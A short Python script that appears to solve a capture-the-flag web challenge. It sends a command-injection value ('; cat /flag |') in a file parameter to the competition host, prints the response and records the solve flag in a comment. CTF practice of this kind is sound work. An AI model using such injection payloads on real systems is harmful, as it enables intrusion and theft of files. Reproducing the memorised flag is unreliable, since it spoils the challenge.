import requests
import urllib.parse as up

def main():
    url = 'https://aurora-web.h4ck.ctfcompetition.com/?'
    file_val = '; cat /flag |'
    term_val = 'h4ck'
    url += 'file=' + up.quote(file_val)
    url += '&term=' + term_val
    print(url)
    
    ret = requests.get(url)
    print(ret.text)
    # https://h4ck1ng.google/solve/Y37_@N07h3r_P3r1_H@X0R

if __name__ == '__main__':
    main()
